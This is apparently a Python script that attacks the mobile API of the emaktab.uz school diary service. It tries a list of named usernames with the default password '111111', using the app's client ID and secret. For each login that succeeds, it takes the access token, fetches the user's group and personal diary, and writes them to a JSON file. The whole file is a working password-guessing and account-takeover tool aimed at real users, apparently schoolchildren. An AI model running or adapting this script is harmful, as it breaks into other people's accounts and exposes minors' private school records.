import requests
import json

logins = [
    # "gabdurahimova0211201",
    # "mubosherv",
    "mushtaryi"
]

headers = {
    "Accept": "application/json",
    "Accept-Encoding": "gzip",
    "app-version": "10.0.0(121)",
    "Connection": "Keep-Alive",
    "Content-Length": "235",                    # Note: this value usually changes per request
    "Content-Type": "application/json; charset=utf-8",
    "device-details": "SamsungSM-A536E",
    "Host": "api.emaktab.uz",
    "User-Agent": "okhttp/4.10.0",
    "x-platform": "android"
}


URL = "https://api.emaktab.uz/mobile/v10.0/authorizations/bycredentials"

suc_login = []
fail_login = []

def get_groups_id(AcessToken: str, userId: str):
    user_context_url = f"https://api.emaktab.uz/mobile/v10.0/users/{userId}/context"
    headers = {
    "Accept-Encoding": "gzip",
    "Access-Token": AcessToken,
    "app-version": "10.0.0(121)",
    "Connection": "Keep-Alive",
    "device-details": "SamsungSM-A536E",
    "Host": "api.emaktab.uz",
    "User-Agent": "okhttp/4.10.0",
    "x-platform": "android"
    }
    response = requests.get(url=user_context_url, headers=headers)
    json_response = response.json()
    group_id = json_response['contextPersons'][0]['group']['id']
    personId = json_response['info']['personId']
    return group_id, personId

def check_dairy(AcessToken: str, userId: str,):
    userGroupId, personId = get_groups_id(AcessToken, userId)
    dairy_url = f"https://api.emaktab.uz/mobile/v10.0/persons/{personId}/groups/{userGroupId}/diary?id="
    headers = {
    "Accept-Encoding": "gzip",
    "Access-Token": AcessToken,
    "app-version": "10.0.0(121)",
    "Connection": "Keep-Alive",
    "device-details": "SamsungSM-A536E",
    "Host": "api.emaktab.uz",
    "User-Agent": "okhttp/4.10.0",
    "x-platform": "android"
    }
    response = requests.get(url=dairy_url, headers=headers)
    if response.json()['type'] == 'systemForbidden':
        print("error occured while checking dairy: " + dairy_url)
        with open("2test.json", "w", encoding="utf-8") as file:
                    json.dump(response.json(),file, indent=4)
        return False
    else:
        with open("2test.json", "w", encoding="utf-8") as file:
                    json.dump(response.json(),file, indent=4)
        return True

def login_in(username: str, password: str):
    data = {
    "clientId": "B70AECAA-A0E2-4E0D-A147-2D6051A1397B",
    "clientSecret": "C0A8880F-30CA-4877-ADD2-26ED9672EC93",
    "scope": "Schools,Relatives,EduGroups,Lessons,marks,EduWorks,Avatar",
    "username": username,
    "password": password,
    "agreeTerms": "false"
    }
    response = requests.post(url=URL, headers=headers,json=data)
    if response.status_code == 200:
        json_response = response.json()
        match json_response['type']:
            case "Success":
                print(f"Successful login for {username}")
                suc_login.append(username)
                usersAccessToken = json_response['credentials']['accessToken']
                userId = json_response['credentials']['userId']
                # print("userToken: "+usersAccessToken+" userId: "+ str(userId))
                if check_dairy(usersAccessToken, userId):
                    print(f"Successful dairy check for {username}")
            case "Error":
                print(f"LOGIN YOKI PAROL NOTOGRI: {username}")
                fail_login.append(username)
            case _:
                print("UNKNOWN ERROR OCCURED")
                with open("test.json", "w", encoding="utf-8") as file:
                    json.dump(json_response,file, indent=4)
    else:
        print(f"ERROR OCCURED for {username}")
        print(response.status_code)


import time
start = time.perf_counter()
for login in logins:
    login_in(login, "111111")
end = time.perf_counter()
print(f"Took {end - start:.3f} seconds")
print(f"--------\nSUCCESSFUL LOGINS:{len(suc_login)}--------\n{suc_login}\n-----------")
print(f"--------\nFAILED LOGINS:{len(fail_login)}--------\n{fail_login}\n-----------")